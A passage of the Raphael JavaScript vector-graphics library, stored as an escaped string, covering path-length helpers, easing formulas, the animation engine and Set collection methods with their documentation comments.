sp;}\n                            subpaths.start = sp;\n                            sp = ["M" + point.x, point.y + "C" + point.n.x, point.n.y, point.end.x, point.end.y, p[5], p[6]].join();\n                            len += l;\n                            x = +p[5];\n                            y = +p[6];\n                            continue;\n                        }\n                        if (!istotal && !subpath) {\n                            point = getPointAtSegmentLength(x, y, p[1], p[2], p[3], p[4], p[5], p[6], length - len);\n                            return {x: point.x, y: point.y, alpha: point.alpha};\n                        }\n                    }\n                    len += l;\n                    x = +p[5];\n                    y = +p[6];\n                }\n                sp += p.shift() + p;\n            }\n            subpaths.end = sp;\n            point = istotal ? len : subpath ? subpaths : R.findDotsAtSegment(x, y, p[0], p[1], p[2], p[3], p[4], p[5], 1);\n            point.alpha && (point = {x: point.x, y: point.y, alpha: point.alpha});\n            return point;\n        };\n    };\n    var getTotalLength = getLengthFactory(1),\n        getPointAtLength = getLengthFactory(),\n        getSubpathsAtLength = getLengthFactory(0, 1);\n    /*\\\n     * Raphael.getTotalLength\n     [ method ]\n     **\n     * Returns length of the given path in pixels.\n     **\n     > Parameters\n     **\n     - path (string) SVG path string.\n     **\n     = (number) length.\n    \\*/\n    R.getTotalLength = getTotalLength;\n    /*\\\n     * Raphael.getPointAtLength\n     [ method ]\n     **\n     * Return coordinates of the point located at the given length on the given path.\n     **\n     > Parameters\n     **\n     - path (string) SVG path string\n     - length (number)\n     **\n     = (object) representation of the point:\n     o {\n     o     x: (number) x coordinate\n     o     y: (number) y coordinate\n     o     alpha: (number) angle of derivative\n     o }\n    \\*/\n    R.getPointAtLength = getPointAtLength;\n    /*\\\n     * Raphael.getSubpath\n     [ method ]\n     **\n     * Return subpath of a given path from given length to given length.\n     **\n     > Parameters\n     **\n     - path (string) SVG path string\n     - from (number) position of the start of the segment\n     - to (number) position of the end of the segment\n     **\n     = (string) pathstring for the segment\n    \\*/\n    R.getSubpath = function (path, from, to) {\n        if (this.getTotalLength(path) - to < 1e-6) {\n            return getSubpathsAtLength(path, from).end;\n        }\n        var a = getSubpathsAtLength(path, to, 1);\n        return from ? getSubpathsAtLength(a, from).end : a;\n    };\n    /*\\\n     * Element.getTotalLength\n     [ method ]\n     **\n     * Returns length of the path in pixels. Only works for element of âpathâ type.\n     = (number) length.\n    \\*/\n    elproto.getTotalLength = function () {\n        var path = this.getPath();\n        if (!path) {\n            return;\n        }\n\n        if (this.node.getTotalLength) {\n            return this.node.getTotalLength();\n        }\n\n        return getTotalLength(path);\n    };\n    /*\\\n     * Element.getPointAtLength\n     [ method ]\n     **\n     * Return coordinates of the point located at the given length on the given path. Only works for element of âpathâ type.\n     **\n     > Parameters\n     **\n     - length (number)\n     **\n     = (object) representation of the point:\n     o {\n     o     x: (number) x coordinate\n     o     y: (number) y coordinate\n     o     alpha: (number) angle of derivative\n     o }\n    \\*/\n    elproto.getPointAtLength = function (length) {\n        var path = this.getPath();\n        if (!path) {\n            return;\n        }\n\n        return getPointAtLength(path, length);\n    };\n    /*\\\n     * Element.getPath\n     [ method ]\n     **\n     * Returns path of the element. Only works for elements of âpathâ type and simple elements like circle.\n     = (object) path\n     **\n    \\*/\n    elproto.getPath = function () {\n        var path,\n            getPath = R._getPath[this.type];\n\n        if (this.type == "text" || this.type == "set") {\n            return;\n        }\n\n        if (getPath) {\n            path = getPath(this);\n        }\n\n        return path;\n    };\n    /*\\\n     * Element.getSubpath\n     [ method ]\n     **\n     * Return subpath of a given element from given length to given length. Only works for element of âpathâ type.\n     **\n     > Parameters\n     **\n     - from (number) position of the start of the segment\n     - to (number) position of the end of the segment\n     **\n     = (string) pathstring for the segment\n    \\*/\n    elproto.getSubpath = function (from, to) {\n        var path = this.getPath();\n        if (!path) {\n            return;\n        }\n\n        return R.getSubpath(path, from, to);\n    };\n    /*\\\n     * Raphael.easing_formulas\n     [ property ]\n     **\n     * Object that contains easing formulas for animation. You could extend it with your own. By default it has following list of easing:\n     # <ul>\n     #     <li>âlinearâ</li>\n     #     <li>â&lt;â or âeaseInâ or âease-inâ</li>\n     #     <li>â>â or âeaseOutâ or âease-outâ</li>\n     #     <li>â&lt;>â or âeaseInOutâ or âease-in-outâ</li>\n     #     <li>âbackInâ or âback-inâ</li>\n     #     <li>âbackOutâ or âback-outâ</li>\n     #     <li>âelasticâ</li>\n     #     <li>âbounceâ</li>\n     # </ul>\n     # <p>See also <a href="https://raphaeljs.com/easing.html">Easing demo</a>.</p>\n    \\*/\n    var ef = R.easing_formulas = {\n        linear: function (n) {\n            return n;\n        },\n        "<": function (n) {\n            return pow(n, 1.7);\n        },\n        ">": function (n) {\n            return pow(n, .48);\n        },\n        "<>": function (n) {\n            var q = .48 - n / 1.04,\n                Q = math.sqrt(.1734 + q * q),\n                x = Q - q,\n                X = pow(abs(x), 1 / 3) * (x < 0 ? -1 : 1),\n                y = -Q - q,\n                Y = pow(abs(y), 1 / 3) * (y < 0 ? -1 : 1),\n                t = X + Y + .5;\n            return (1 - t) * 3 * t * t + t * t * t;\n        },\n        backIn: function (n) {\n            var s = 1.70158;\n            return n * n * ((s + 1) * n - s);\n        },\n        backOut: function (n) {\n            n = n - 1;\n            var s = 1.70158;\n            return n * n * ((s + 1) * n + s) + 1;\n        },\n        elastic: function (n) {\n            if (n == !!n) {\n                return n;\n            }\n            return pow(2, -10 * n) * math.sin((n - .075) * (2 * PI) / .3) + 1;\n        },\n        bounce: function (n) {\n            var s = 7.5625,\n                p = 2.75,\n                l;\n            if (n < (1 / p)) {\n                l = s * n * n;\n            } else {\n                if (n < (2 / p)) {\n                    n -= (1.5 / p);\n                    l = s * n * n + .75;\n                } else {\n                    if (n < (2.5 / p)) {\n                        n -= (2.25 / p);\n                        l = s * n * n + .9375;\n                    } else {\n                        n -= (2.625 / p);\n                        l = s * n * n + .984375;\n                    }\n                }\n            }\n            return l;\n        }\n    };\n    ef.easeIn = ef["ease-in"] = ef["<"];\n    ef.easeOut = ef["ease-out"] = ef[">"];\n    ef.easeInOut = ef["ease-in-out"] = ef["<>"];\n    ef["back-in"] = ef.backIn;\n    ef["back-out"] = ef.backOut;\n\n    var animationElements = [],\n        requestAnimFrame = window.requestAnimationFrame       ||\n                           window.webkitRequestAnimationFrame ||\n                           window.mozRequestAnimationFrame    ||\n                           window.oRequestAnimationFrame      ||\n                           window.msRequestAnimationFrame     ||\n                           function (callback) {\n                               setTimeout(callback, 16);\n                           },\n        animation = function () {\n            var Now = +new Date,\n                l = 0;\n            for (; l < animationElements.length; l++) {\n                var e = animationElements[l];\n                if (e.el.removed || e.paused) {\n                    continue;\n                }\n                var time = Now - e.start,\n                    ms = e.ms,\n                    easing = e.easing,\n                    from = e.from,\n                    diff = e.diff,\n                    to = e.to,\n                    t = e.t,\n                    that = e.el,\n                    set = {},\n                    now,\n                    init = {},\n                    key;\n                if (e.initstatus) {\n                    time = (e.initstatus * e.anim.top - e.prev) / (e.percent - e.prev) * ms;\n                    e.status = e.initstatus;\n                    delete e.initstatus;\n                    e.stop && animationElements.splice(l--, 1);\n                } else {\n                    e.status = (e.prev + (e.percent - e.prev) * (time / ms)) / e.anim.top;\n                }\n                if (time < 0) {\n                    continue;\n                }\n                if (time < ms) {\n                    var pos = easing(time / ms);\n                    for (var attr in from) if (from[has](attr)) {\n                        switch (availableAnimAttrs[attr]) {\n                            case nu:\n                                now = +from[attr] + pos * ms * diff[attr];\n                                break;\n                            case "colour":\n                                now = "rgb(" + [\n                                    upto255(round(from[attr].r + pos * ms * diff[attr].r)),\n                                    upto255(round(from[attr].g + pos * ms * diff[attr].g)),\n                                    upto255(round(from[attr].b + pos * ms * diff[attr].b))\n                                ].join(",") + ")";\n                                break;\n                            case "path":\n                                now = [];\n                                for (var i = 0, ii = from[attr].length; i < ii; i++) {\n                                    now[i] = [from[attr][i][0]];\n                                    for (var j = 1, jj = from[attr][i].length; j < jj; j++) {\n                                        now[i][j] = +from[attr][i][j] + pos * ms * diff[attr][i][j];\n                                    }\n                                    now[i] = now[i].join(S);\n                                }\n                                now = now.join(S);\n                                break;\n                            case "transform":\n                                if (diff[attr].real) {\n                                    now = [];\n                                    for (i = 0, ii = from[attr].length; i < ii; i++) {\n                                        now[i] = [from[attr][i][0]];\n                                        for (j = 1, jj = from[attr][i].length; j < jj; j++) {\n                                            now[i][j] = from[attr][i][j] + pos * ms * diff[attr][i][j];\n                                        }\n                                    }\n                                } else {\n                                    var get = function (i) {\n                                        return +from[attr][i] + pos * ms * diff[attr][i];\n                                    };\n                                    // now = [["r", get(2), 0, 0], ["t", get(3), get(4)], ["s", get(0), get(1), 0, 0]];\n                                    now = [["m", get(0), get(1), get(2), get(3), get(4), get(5)]];\n                                }\n                                break;\n                            case "csv":\n                                if (attr == "clip-rect") {\n                                    now = [];\n                                    i = 4;\n                                    while (i--) {\n                                        now[i] = +from[attr][i] + pos * ms * diff[attr][i];\n                                    }\n                                }\n                                break;\n                            default:\n                                var from2 = [][concat](from[attr]);\n                                now = [];\n                                i = that.paper.customAttributes[attr].length;\n                                while (i--) {\n                                    now[i] = +from2[i] + pos * ms * diff[attr][i];\n                                }\n                                break;\n                        }\n                        set[attr] = now;\n                    }\n                    that.attr(set);\n                    (function (id, that, anim) {\n                        setTimeout(function () {\n                            eve("raphael.anim.frame." + id, that, anim);\n                        });\n                    })(that.id, that, e.anim);\n                } else {\n                    (function(f, el, a) {\n                        setTimeout(function() {\n                            eve("raphael.anim.frame." + el.id, el, a);\n                            eve("raphael.anim.finish." + el.id, el, a);\n                            R.is(f, "function") && f.call(el);\n                        });\n                    })(e.callback, that, e.anim);\n                    that.attr(to);\n                    animationElements.splice(l--, 1);\n                    if (e.repeat > 1 && !e.next) {\n                        for (key in to) if (to[has](key)) {\n                            init[key] = e.totalOrigin[key];\n                        }\n                        e.el.attr(init);\n                        runAnimation(e.anim, e.el, e.anim.percents[0], null, e.totalOrigin, e.repeat - 1);\n                    }\n                    if (e.next && !e.stop) {\n                        runAnimation(e.anim, e.el, e.next, null, e.totalOrigin, e.repeat);\n                    }\n                }\n            }\n            animationElements.length && requestAnimFrame(animation);\n        },\n        upto255 = function (color) {\n            return color > 255 ? 255 : color < 0 ? 0 : color;\n        };\n    /*\\\n     * Element.animateWith\n     [ method ]\n     **\n     * Acts similar to @Element.animate, but ensure that given animation runs in sync with another given element.\n     **\n     > Parameters\n     **\n     - el (object) element to sync with\n     - anim (object) animation to sync with\n     - params (object) #optional final attributes for the element, see also @Element.attr\n     - ms (number) #optional number of milliseconds for animation to run\n     - easing (string) #optional easing type. Accept on of @Raphael.easing_formulas or CSS format: `cubic&#x2010;bezier(XX,&#160;XX,&#160;XX,&#160;XX)`\n     - callback (function) #optional callback function. Will be called at the end of animation.\n     * or\n     - element (object) element to sync with\n     - anim (object) animation to sync with\n     - animation (object) #optional animation object, see @Raphael.animation\n     **\n     = (object) original element\n    \\*/\n    elproto.animateWith = function (el, anim, params, ms, easing, callback) {\n        var element = this;\n        if (element.removed) {\n            callback && callback.call(element);\n            return element;\n        }\n        var a = params instanceof Animation ? params : R.animation(params, ms, easing, callback),\n            x, y;\n        runAnimation(a, element, a.percents[0], null, element.attr());\n        for (var i = 0, ii = animationElements.length; i < ii; i++) {\n            if (animationElements[i].anim == anim && animationElements[i].el == el) {\n                animationElements[ii - 1].start = animationElements[i].start;\n                break;\n            }\n        }\n        return element;\n        //\n        //\n        // var a = params ? R.animation(params, ms, easing, callback) : anim,\n        //     status = element.status(anim);\n        // return this.animate(a).status(a, status * anim.ms / a.ms);\n    };\n    function CubicBezierAtTime(t, p1x, p1y, p2x, p2y, duration) {\n        var cx = 3 * p1x,\n            bx = 3 * (p2x - p1x) - cx,\n            ax = 1 - cx - bx,\n            cy = 3 * p1y,\n            by = 3 * (p2y - p1y) - cy,\n            ay = 1 - cy - by;\n        function sampleCurveX(t) {\n            return ((ax * t + bx) * t + cx) * t;\n        }\n        function solve(x, epsilon) {\n            var t = solveCurveX(x, epsilon);\n            return ((ay * t + by) * t + cy) * t;\n        }\n        function solveCurveX(x, epsilon) {\n            var t0, t1, t2, x2, d2, i;\n            for(t2 = x, i = 0; i < 8; i++) {\n                x2 = sampleCurveX(t2) - x;\n                if (abs(x2) < epsilon) {\n                    return t2;\n                }\n                d2 = (3 * ax * t2 + 2 * bx) * t2 + cx;\n                if (abs(d2) < 1e-6) {\n                    break;\n                }\n                t2 = t2 - x2 / d2;\n            }\n            t0 = 0;\n            t1 = 1;\n            t2 = x;\n            if (t2 < t0) {\n                return t0;\n            }\n            if (t2 > t1) {\n                return t1;\n            }\n            while (t0 < t1) {\n                x2 = sampleCurveX(t2);\n                if (abs(x2 - x) < epsilon) {\n                    return t2;\n                }\n                if (x > x2) {\n                    t0 = t2;\n                } else {\n                    t1 = t2;\n                }\n                t2 = (t1 - t0) / 2 + t0;\n            }\n            return t2;\n        }\n        return solve(t, 1 / (200 * duration));\n    }\n    elproto.onAnimation = function (f) {\n        f ? eve.on("raphael.anim.frame." + this.id, f) : eve.unbind("raphael.anim.frame." + this.id);\n        return this;\n    };\n    function Animation(anim, ms) {\n        var percents = [],\n            newAnim = {};\n        this.ms = ms;\n        this.times = 1;\n        if (anim) {\n            for (var attr in anim) if (anim[has](attr)) {\n                newAnim[toFloat(attr)] = anim[attr];\n                percents.push(toFloat(attr));\n            }\n            percents.sort(sortByNumber);\n        }\n        this.anim = newAnim;\n        this.top = percents[percents.length - 1];\n        this.percents = percents;\n    }\n    /*\\\n     * Animation.delay\n     [ method ]\n     **\n     * Creates a copy of existing animation object with given delay.\n     **\n     > Parameters\n     **\n     - delay (number) number of ms to pass between animation start and actual animation\n     **\n     = (object) new altered Animation object\n     | var anim = Raphael.animation({cx: 10, cy: 20}, 2e3);\n     | circle1.animate(anim); // run the given animation immediately\n     | circle2.animate(anim.delay(500)); // run the given animation after 500 ms\n    \\*/\n    Animation.prototype.delay = function (delay) {\n        var a = new Animation(this.anim, this.ms);\n        a.times = this.times;\n        a.del = +delay || 0;\n        return a;\n    };\n    /*\\\n     * Animation.repeat\n     [ method ]\n     **\n     * Creates a copy of existing animation object with given repetition.\n     **\n     > Parameters\n     **\n     - repeat (number) number iterations of animation. For infinite animation pass `Infinity`\n     **\n     = (object) new altered Animation object\n    \\*/\n    Animation.prototype.repeat = function (times) {\n        var a = new Animation(this.anim, this.ms);\n        a.del = this.del;\n        a.times = math.floor(mmax(times, 0)) || 1;\n        return a;\n    };\n    function runAnimation(anim, element, percent, status, totalOrigin, times) {\n        percent = toFloat(percent);\n        var params,\n            isInAnim,\n            isInAnimSet,\n            percents = [],\n            next,\n            prev,\n            timestamp,\n            ms = anim.ms,\n            from = {},\n            to = {},\n            diff = {};\n        if (status) {\n            for (i = 0, ii = animationElements.length; i < ii; i++) {\n                var e = animationElements[i];\n                if (e.el.id == element.id && e.anim == anim) {\n                    if (e.percent != percent) {\n                        animationElements.splice(i, 1);\n                        isInAnimSet = 1;\n                    } else {\n                        isInAnim = e;\n                    }\n                    element.attr(e.totalOrigin);\n                    break;\n                }\n            }\n        } else {\n            status = +to; // NaN\n        }\n        for (var i = 0, ii = anim.percents.length; i < ii; i++) {\n            if (anim.percents[i] == percent || anim.percents[i] > status * anim.top) {\n                percent = anim.percents[i];\n                prev = anim.percents[i - 1] || 0;\n                ms = ms / anim.top * (percent - prev);\n                next = anim.percents[i + 1];\n                params = anim.anim[percent];\n                break;\n            } else if (status) {\n                element.attr(anim.anim[anim.percents[i]]);\n            }\n        }\n        if (!params) {\n            return;\n        }\n        if (!isInAnim) {\n            for (var attr in params) if (params[has](attr)) {\n                if (availableAnimAttrs[has](attr) || element.paper.customAttributes[has](attr)) {\n                    from[attr] = element.attr(attr);\n                    (from[attr] == null) && (from[attr] = availableAttrs[attr]);\n                    to[attr] = params[attr];\n                    switch (availableAnimAttrs[attr]) {\n                        case nu:\n                            diff[attr] = (to[attr] - from[attr]) / ms;\n                            break;\n                        case "colour":\n                            from[attr] = R.getRGB(from[attr]);\n                            var toColour = R.getRGB(to[attr]);\n                            diff[attr] = {\n                                r: (toColour.r - from[attr].r) / ms,\n                                g: (toColour.g - from[attr].g) / ms,\n                                b: (toColour.b - from[attr].b) / ms\n                            };\n                            break;\n                        case "path":\n                            var pathes = path2curve(from[attr], to[attr]),\n                                toPath = pathes[1];\n                            from[attr] = pathes[0];\n                            diff[attr] = [];\n                            for (i = 0, ii = from[attr].length; i < ii; i++) {\n                                diff[attr][i] = [0];\n                                for (var j = 1, jj = from[attr][i].length; j < jj; j++) {\n                                    diff[attr][i][j] = (toPath[i][j] - from[attr][i][j]) / ms;\n                                }\n                            }\n                            break;\n                        case "transform":\n                            var _ = element._,\n                                eq = equaliseTransform(_[attr], to[attr]);\n                            if (eq) {\n                                from[attr] = eq.from;\n                                to[attr] = eq.to;\n                                diff[attr] = [];\n                                diff[attr].real = true;\n                                for (i = 0, ii = from[attr].length; i < ii; i++) {\n                                    diff[attr][i] = [from[attr][i][0]];\n                                    for (j = 1, jj = from[attr][i].length; j < jj; j++) {\n                                        diff[attr][i][j] = (to[attr][i][j] - from[attr][i][j]) / ms;\n                                    }\n                                }\n                            } else {\n                                var m = (element.matrix || new Matrix),\n                                    to2 = {\n                                        _: {transform: _.transform},\n                                        getBBox: function () {\n                                            return element.getBBox(1);\n                                        }\n                                    };\n                                from[attr] = [\n                                    m.a,\n                                    m.b,\n                                    m.c,\n                                    m.d,\n                                    m.e,\n                                    m.f\n                                ];\n                                extractTransform(to2, to[attr]);\n                                to[attr] = to2._.transform;\n                                diff[attr] = [\n                                    (to2.matrix.a - m.a) / ms,\n                                    (to2.matrix.b - m.b) / ms,\n                                    (to2.matrix.c - m.c) / ms,\n                                    (to2.matrix.d - m.d) / ms,\n                                    (to2.matrix.e - m.e) / ms,\n                                    (to2.matrix.f - m.f) / ms\n                                ];\n                                // from[attr] = [_.sx, _.sy, _.deg, _.dx, _.dy];\n                                // var to2 = {_:{}, getBBox: function () { return element.getBBox(); }};\n                                // extractTransform(to2, to[attr]);\n                                // diff[attr] = [\n                                //     (to2._.sx - _.sx) / ms,\n                                //     (to2._.sy - _.sy) / ms,\n                                //     (to2._.deg - _.deg) / ms,\n                                //     (to2._.dx - _.dx) / ms,\n                                //     (to2._.dy - _.dy) / ms\n                                // ];\n                            }\n                            break;\n                        case "csv":\n                            var values = Str(params[attr])[split](separator),\n                                from2 = Str(from[attr])[split](separator);\n                            if (attr == "clip-rect") {\n                                from[attr] = from2;\n                                diff[attr] = [];\n                                i = from2.length;\n                                while (i--) {\n                                    diff[attr][i] = (values[i] - from[attr][i]) / ms;\n                                }\n                            }\n                            to[attr] = values;\n                            break;\n                        default:\n                            values = [][concat](params[attr]);\n                            from2 = [][concat](from[attr]);\n                            diff[attr] = [];\n                            i = element.paper.customAttributes[attr].length;\n                            while (i--) {\n                                diff[attr][i] = ((values[i] || 0) - (from2[i] || 0)) / ms;\n                            }\n                            break;\n                    }\n                }\n            }\n            var easing = params.easing,\n                easyeasy = R.easing_formulas[easing];\n            if (!easyeasy) {\n                easyeasy = Str(easing).match(bezierrg);\n                if (easyeasy && easyeasy.length == 5) {\n                    var curve = easyeasy;\n                    easyeasy = function (t) {\n                        return CubicBezierAtTime(t, +curve[1], +curve[2], +curve[3], +curve[4], ms);\n                    };\n                } else {\n                    easyeasy = pipe;\n                }\n            }\n            timestamp = params.start || anim.start || +new Date;\n            e = {\n                anim: anim,\n                percent: percent,\n                timestamp: timestamp,\n                start: timestamp + (anim.del || 0),\n                status: 0,\n                initstatus: status || 0,\n                stop: false,\n                ms: ms,\n                easing: easyeasy,\n                from: from,\n                diff: diff,\n                to: to,\n                el: element,\n                callback: params.callback,\n                prev: prev,\n                next: next,\n                repeat: times || anim.times,\n                origin: element.attr(),\n                totalOrigin: totalOrigin\n            };\n            animationElements.push(e);\n            if (status && !isInAnim && !isInAnimSet) {\n                e.stop = true;\n                e.start = new Date - ms * status;\n                if (animationElements.length == 1) {\n                    return animation();\n                }\n            }\n            if (isInAnimSet) {\n                e.start = new Date - e.ms * status;\n            }\n            animationElements.length == 1 && requestAnimFrame(animation);\n        } else {\n            isInAnim.initstatus = status;\n            isInAnim.start = new Date - isInAnim.ms * status;\n        }\n        eve("raphael.anim.start." + element.id, element, anim);\n    }\n    /*\\\n     * Raphael.animation\n     [ method ]\n     **\n     * Creates an animation object that can be passed to the @Element.animate or @Element.animateWith methods.\n     * See also @Animation.delay and @Animation.repeat methods.\n     **\n     > Parameters\n     **\n     - params (object) final attributes for the element, see also @Element.attr\n     - ms (number) number of milliseconds for animation to run\n     - easing (string) #optional easing type. Accept one of @Raphael.easing_formulas or CSS format: `cubic&#x2010;bezier(XX,&#160;XX,&#160;XX,&#160;XX)`\n     - callback (function) #optional callback function. Will be called at the end of animation.\n     **\n     = (object) @Animation\n    \\*/\n    R.animation = function (params, ms, easing, callback) {\n        if (params instanceof Animation) {\n            return params;\n        }\n        if (R.is(easing, "function") || !easing) {\n            callback = callback || easing || null;\n            easing = null;\n        }\n        params = Object(params);\n        ms = +ms || 0;\n        var p = {},\n            json,\n            attr;\n        for (attr in params) if (params[has](attr) && toFloat(attr) != attr && toFloat(attr) + "%" != attr) {\n            json = true;\n            p[attr] = params[attr];\n        }\n        if (!json) {\n            // if percent-like syntax is used and end-of-all animation callback used\n            if(callback){\n                // find the last one\n                var lastKey = 0;\n                for(var i in params){\n                    var percent = toInt(i);\n                    if(params[has](i) && percent > lastKey){\n                        lastKey = percent;\n                    }\n                }\n                lastKey += \'%\';\n                // if already defined callback in the last keyframe, skip\n                !params[lastKey].callback && (params[lastKey].callback = callback);\n            }\n          return new Animation(params, ms);\n        } else {\n            easing && (p.easing = easing);\n            callback && (p.callback = callback);\n            return new Animation({100: p}, ms);\n        }\n    };\n    /*\\\n     * Element.animate\n     [ method ]\n     **\n     * Creates and starts animation for given element.\n     **\n     > Parameters\n     **\n     - params (object) final attributes for the element, see also @Element.attr\n     - ms (number) number of milliseconds for animation to run\n     - easing (string) #optional easing type. Accept one of @Raphael.easing_formulas or CSS format: `cubic&#x2010;bezier(XX,&#160;XX,&#160;XX,&#160;XX)`\n     - callback (function) #optional callback function. Will be called at the end of animation.\n     * or\n     - animation (object) animation object, see @Raphael.animation\n     **\n     = (object) original element\n    \\*/\n    elproto.animate = function (params, ms, easing, callback) {\n        var element = this;\n        if (element.removed) {\n            callback && callback.call(element);\n            return element;\n        }\n        var anim = params instanceof Animation ? params : R.animation(params, ms, easing, callback);\n        runAnimation(anim, element, anim.percents[0], null, element.attr());\n        return element;\n    };\n    /*\\\n     * Element.setTime\n     [ method ]\n     **\n     * Sets the status of animation of the element in milliseconds. Similar to @Element.status method.\n     **\n     > Parameters\n     **\n     - anim (object) animation object\n     - value (number) number of milliseconds from the beginning of the animation\n     **\n     = (object) original element if `value` is specified\n     * Note, that during animation following events are triggered:\n     *\n     * On each animation frame event `anim.frame.<id>`, on start `anim.start.<id>` and on end `anim.finish.<id>`.\n    \\*/\n    elproto.setTime = function (anim, value) {\n        if (anim && value != null) {\n            this.status(anim, mmin(value, anim.ms) / anim.ms);\n        }\n        return this;\n    };\n    /*\\\n     * Element.status\n     [ method ]\n     **\n     * Gets or sets the status of animation of the element.\n     **\n     > Parameters\n     **\n     - anim (object) #optional animation object\n     - value (number) #optional 0 â 1. If specified, method works like a setter and sets the status of a given animation to the value. This will cause animation to jump to the given position.\n     **\n     = (number) status\n     * or\n     = (array) status if `anim` is not specified. Array of objects in format:\n     o {\n     o     anim: (object) animation object\n     o     status: (number) status\n     o }\n     * or\n     = (object) original element if `value` is specified\n    \\*/\n    elproto.status = function (anim, value) {\n        var out = [],\n            i = 0,\n            len,\n            e;\n        if (value != null) {\n            runAnimation(anim, this, -1, mmin(value, 1));\n            return this;\n        } else {\n            len = animationElements.length;\n            for (; i < len; i++) {\n                e = animationElements[i];\n                if (e.el.id == this.id && (!anim || e.anim == anim)) {\n                    if (anim) {\n                        return e.status;\n                    }\n                    out.push({\n                        anim: e.anim,\n                        status: e.status\n                    });\n                }\n            }\n            if (anim) {\n                return 0;\n            }\n            return out;\n        }\n    };\n    /*\\\n     * Element.pause\n     [ method ]\n     **\n     * Stops animation of the element with ability to resume it later on.\n     **\n     > Parameters\n     **\n     - anim (object) #optional animation object\n     **\n     = (object) original element\n    \\*/\n    elproto.pause = function (anim) {\n        for (var i = 0; i < animationElements.length; i++) if (animationElements[i].el.id == this.id && (!anim || animationElements[i].anim == anim)) {\n            if (eve("raphael.anim.pause." + this.id, this, animationElements[i].anim) !== false) {\n                animationElements[i].paused = true;\n            }\n        }\n        return this;\n    };\n    /*\\\n     * Element.resume\n     [ method ]\n     **\n     * Resumes animation if it was paused with @Element.pause method.\n     **\n     > Parameters\n     **\n     - anim (object) #optional animation object\n     **\n     = (object) original element\n    \\*/\n    elproto.resume = function (anim) {\n        for (var i = 0; i < animationElements.length; i++) if (animationElements[i].el.id == this.id && (!anim || animationElements[i].anim == anim)) {\n            var e = animationElements[i];\n            if (eve("raphael.anim.resume." + this.id, this, e.anim) !== false) {\n                delete e.paused;\n                this.status(e.anim, e.status);\n            }\n        }\n        return this;\n    };\n    /*\\\n     * Element.stop\n     [ method ]\n     **\n     * Stops animation of the element.\n     **\n     > Parameters\n     **\n     - anim (object) #optional animation object\n     **\n     = (object) original element\n    \\*/\n    elproto.stop = function (anim) {\n        for (var i = 0; i < animationElements.length; i++) if (animationElements[i].el.id == this.id && (!anim || animationElements[i].anim == anim)) {\n            if (eve("raphael.anim.stop." + this.id, this, animationElements[i].anim) !== false) {\n                animationElements.splice(i--, 1);\n            }\n        }\n        return this;\n    };\n    function stopAnimation(paper) {\n        for (var i = 0; i < animationElements.length; i++) if (animationElements[i].el.paper == paper) {\n            animationElements.splice(i--, 1);\n        }\n    }\n    eve.on("raphael.remove", stopAnimation);\n    eve.on("raphael.clear", stopAnimation);\n    elproto.toString = function () {\n        return "Rapha\\xebl\\u2019s object";\n    };\n\n    // Set\n    var Set = function (items) {\n        this.items = [];\n        this.length = 0;\n        this.type = "set";\n        if (items) {\n            for (var i = 0, ii = items.length; i < ii; i++) {\n                if (items[i] && (items[i].constructor == elproto.constructor || items[i].constructor == Set)) {\n                    this[this.items.length] = this.items[this.items.length] = items[i];\n                    this.length++;\n                }\n            }\n        }\n    },\n    setproto = Set.prototype;\n    /*\\\n     * Set.push\n     [ method ]\n     **\n     * Adds each argument to the current set.\n     = (object) original element\n    \\*/\n    setproto.push = function () {\n        var item,\n            len;\n        for (var i = 0, ii = arguments.length; i < ii; i++) {\n            item = arguments[i];\n            if (item && (item.constructor == elproto.constructor || item.constructor == Set)) {\n                len = this.items.length;\n                this[len] = this.items[len] = item;\n                this.length++;\n            }\n        }\n        return this;\n    };\n    /*\\\n     * Set.pop\n     [ method ]\n     **\n     * Removes last element and returns it.\n     = (object) element\n    \\*/\n    setproto.pop = function () {\n        this.length && delete this[this.length--];\n        return this.items.pop();\n    };\n    /*\\\n     * Set.forEach\n     [ method ]\n     **\n     * Executes given function for each element in the set.\n     *\n     * If function returns `false` it will stop loop running.\n     **\n     > Parameters\n     **\n     - callback (function) function to run\n     - thisArg (object) context object for the callback\n     = (object) Set object\n    \\*/\n    setproto.forEach = function (callback, thisArg) {\n        for (var i = 0, ii = this.items.length; i < ii; i++) {\n            if (callback.call(thisArg, this.items[i], i) === false) {\n                return this;\n            }\n        }\n        return this;\n    };\n    for (var method in elproto) if (elproto[has](method)) {\n        setproto[method] = (function (methodname) {\n            return function () {\n                var arg = arguments;\n                return this.forEach(function (el) {\n                    el[methodname][apply](el, arg);\n                });\n            };\n        })(method);\n    }\n    setproto.attr = function (name, value) {\n        if (name && R.is(name, array) && R.is(name[0], "object")) {\n            for (var j = 0, jj = name.length; j < jj; j++) {\n                this.items[j].attr(name[j]);\n            }\n        } else {\n            for (var i = 0, ii = this.items.length; i < ii; i++) {\n                this.items[i].attr(name, value);\n            }\n        }\n        return this;\n    };\n    /*\\\n     * Set.clear\n     [ method ]\n     **\n     * Removes all elements from the set\n    \\*/\n    setproto.clear = function () {\n        while (this.length) {\n            this.pop();\n        }\n    };\n    /*\\\n     * Set.splice\n     [ method ]\n     **\n     * Removes given element from the set\n     **\n     > Parameters\n     **\n     - index (number) position of the deletion\n     - count (number) number of element to remove\n     - insertionâ¦ (object) #optional elements to insert\n     = (object) set elements that were deleted\n    \\*/\n    setproto.splice = function (index, count, insertion) {\n        index = index < 0 ? mmax(this.length + index, 0) : index;\n        count = mmax(0, mmin(this.length - index, count));\n        var tail = [],\n            todel = [],\n            args = [],\n            i;\n        for (i = 2; i < arguments.length; i++) {\n            args.push(arguments[i]);\n        }\n        for (i = 0; i < count; i++) {\n            todel.push(this[index + i]);\n        }\n        for (; i < this.length - index; i++) {\n            tail.push(this[index + i]);\n        }\n        var arglen = args.length;\n        for (i = 0; i < arglen + tail.length; i++) {\n            this.items[index + i] = this[index + i] = i < arglen ? args[i] : tail[i - arglen];\n        }\n        i = this.items.length = this.length -= count - arglen;\n        while (this[i]) {\n            delete this[i++];\n        }\n        return new Set(todel);\n    };\n    /*\\\n     * Set.exclude\n     [ method ]\n     **\n     * Removes given element from the set\n     **\n     > Parameters\n     **\n     - element (object) element to remove\n     = (boolean) `true` if object was found & removed from the set\n    \\*/\n    setproto.exclude = function (el) {\n        for (var i = 0, ii = this.length; i < ii; i++) if (this[i] == el) {\n            this.splice(i, 1);\n            return true;\n        }\n    };\n    setproto.animate = function (params, ms, easing, callback) {\n        (R.is(easing, "function") || !easing) && (callback = easing || null);\n        var len = this.items.length,\n            i = len,\n            item,\n            set = this,\n            collector;\n        if (!len) {\n            return this;\n        }\n        callback && (collector = function () {\n            !--len && callback.call(set);\n        });\n        easing = R.is(easing, string) ? easing : collector;\n        var anim = R.animation(params, ms, easing, collector);\n        